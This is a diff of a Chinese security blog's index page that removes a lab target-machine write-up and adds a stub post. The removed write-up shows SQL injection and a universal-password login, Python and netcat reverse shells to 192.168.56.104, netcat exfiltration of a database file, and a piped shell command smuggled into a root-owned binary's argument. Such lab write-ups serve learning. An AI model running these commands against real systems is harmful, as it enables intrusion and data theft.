@@ -190,110 +190,6 @@
 </div>
 
 <div class="post">
-    <a href="/2024/01/24/easy%E9%9D%B6%E6%9C%BA1/">
-        <h2 class="post-title"></h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/1/24
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>尝试sql注入：</p>
-<p><img src="C:\Users\mio\AppData\Roaming\Typora\typora-user-images\image-20240124173202197.png" alt="image-20240124173202197"></p>
-<p>发现存在注入：</p>
-<p><img src="C:\Users\mio\AppData\Roaming\Typora\typora-user-images\image-20240124173222409.png" alt="image-20240124173222409"></p>
-<p>我直接一个万能密码</p>
-<p>进来了</p>
-<p><img src="C:\Users\mio\AppData\Roaming\Typora\typora-user-images\image-20240124173303505.png" alt="image-20240124173303505"></p>
-<p>尝试多命令执行</p>
-<p>成功</p>
-<p><img src="C:\Users\mio\AppData\Roaming\Typora\typora-user-images\image-20240124173337803.png" alt="image-20240124173337803"></p>
-<p>尝试弹shell</p>
-<ol>
-<li>python弹shell，因为页面显示有python所以尝试python</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bash &amp; python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.104&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>成功</p>
-<ol start="2">
-<li>nc弹shell</li>
-</ol>
-<p>使用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which nc</span><br></pre></td></tr></table></figure>
-
-<p>查看当前系统是否有nc命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129193750271.png" alt="image-20240129193750271"></p>
-<p>有的，可以使用nc弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.104 4444 -e /bin/sh #有的Linux发行版有nc命令，但没有-e参数，可以使用如下方法</span><br><span class="line"></span><br><span class="line">nc 192.168.56.104 4444 | /bin/sh | nc 192.168.56.104 6666 #nc串联</span><br><span class="line">#nc串联，监听4444端口终端输入命令，监听6666端口的终端回显命令</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129195143500.png" alt="image-20240129195143500"></p>
-<p>因为nc串联这种方式太麻烦所以使用python弹shell</p>
-<p>升级shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">ctrl z</span><br><span class="line">stty raw -echo;fg;reset</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\mio\AppData\Roaming\Typora\typora-user-images\image-20240124173542916.png" alt="image-20240124173542916"></p>
-<p>查看一下当前目录下的文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129200403595.png" alt="image-20240129200403595"></p>
-<p>找到一个py文件和sql文件</p>
-<p>查看一下py源码，可以看出是连接数据库的代码，并且连接的是当前目录下的database.sql</p>
-<p>尝试查看sql文件，发现cat无效，也不存在sqlite3数据库</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129200814193.png" alt="image-20240129200814193"></p>
-<p>那就将文件传到本机的kali上，使用kali查看sql文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#监听本地端口6666将接收的文件命名为db.sql</span><br><span class="line">nc -nvlp 6666 &gt;db.sql</span><br><span class="line"></span><br><span class="line">#将文件database.sql传输到ip为192.168.56.104端口号为6666的系统上</span><br><span class="line">nc 192.168.56.104 6666  &lt; database.sql</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129201809059.png" alt="image-20240129201809059"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129202030389.png" alt="image-20240129202030389"></p>
-<p>接下来使用kali主机的sqlite数据库打开db.sql</p>
-<p>使用命令查看db.sql</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite3</span><br><span class="line">.open db.sql</span><br><span class="line">.database</span><br><span class="line">.dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129211303509.png" alt="image-20240129211303509"></p>
-<p>找到密码，将其存入passwd文件中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129211347838.png" alt="image-20240129211347838"></p>
-<p>通过命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>查询使用bash进行登录的用户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129211755979.png" alt="image-20240129211755979"></p>
-<p>将用户写入user文件中</p>
-<p>赋予权限进行爆破</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129212013441.png" alt="image-20240129212013441"></p>
-<p>爆破失败</p>
-<p>查看一下用户根目录有哪些东西</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129212131065.png" alt="image-20240129212131065"></p>
-<p>发现一个root权限的执行文件</p>
-<p>查看一下源代码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129212233941.png" alt="image-20240129212233941"></p>
-<p>代码审计一下：执行该文件时需要在后面再跟一个系统命令</p>
-<p>于是我们使用这个来弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;a|nc 192.168.56.104 7777 | /bin/sh | nc 192.168.56.104 8888&quot;</span><br></pre></td></tr></table></figure>
-
-<p>使用nc串联来接收shell，拿到root权限</p>
-<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240129212619191.png" alt="image-20240129212619191"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/01/24/easy%E9%9D%B6%E6%9C%BA1/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
     <a href="/2024/01/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
         <h2 class="post-title">文件包含</h2>
     </a>
@@ -539,6 +435,37 @@
         
     </div>
     <a href="/2024/01/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/01/04/Oracle%E9%9D%B6%E6%9C%BA1/">
+        <h2 class="post-title">Oracle靶机1</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>使用linux打靶</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/01/04/Oracle%E9%9D%B6%E6%9C%BA1/" class="go-post">阅读全文</a>
 </div>
 
 
